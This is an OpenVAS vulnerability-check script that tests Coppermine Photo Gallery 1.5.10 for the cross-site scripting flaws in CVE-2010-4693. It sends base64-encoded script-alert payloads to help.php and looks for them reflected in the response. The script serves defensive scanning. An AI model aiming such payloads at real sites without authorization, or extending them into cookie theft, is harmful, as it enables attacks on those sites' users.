###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_coppermine_photo_gallery_45600.nasl 3507 2016-06-14 04:32:30Z ckuerste $
#
# Coppermine Photo Gallery Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Coppermine Photo Gallery is prone to multiple cross-site-scripting
vulnerabilities because it fails to properly sanitize user-
supplied input.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and to launch other attacks.

Coppermine Photo Gallery 1.5.10 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(103008);
 script_version("$Revision: 3507 $");
 script_tag(name:"last_modification", value:"$Date: 2016-06-14 06:32:30 +0200 (Tue, 14 Jun 2016) $");
 script_tag(name:"creation_date", value:"2011-01-04 15:14:45 +0100 (Tue, 04 Jan 2011)");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-4693");
 script_bugtraq_id(45600);

 script_name("Coppermine Photo Gallery Multiple Cross Site Scripting Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45600");
 script_xref(name : "URL" , value : "http://www.waraxe.us/advisory-79.html");
 script_xref(name : "URL" , value : "http://coppermine-gallery.net/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if Coppermine Photo Gallery is prone to cross-site-scripting	vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("coppermine_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"coppermine"))exit(0);
   
url = string(dir, "/help.php?base=1&h=czozMzoiPHNjcmlwdD5hbGVydCgnaGVhZGVyJyk7PC9zY3JpcHQ%2bIjs&t=czozMToiPHNjcmlwdD5hbGVydCgndGV4dCcpOzwvc2NyaXB0PiI7");

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\('header'\);</script></h1><script>alert\('text'\);</script>", check_header:TRUE)) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
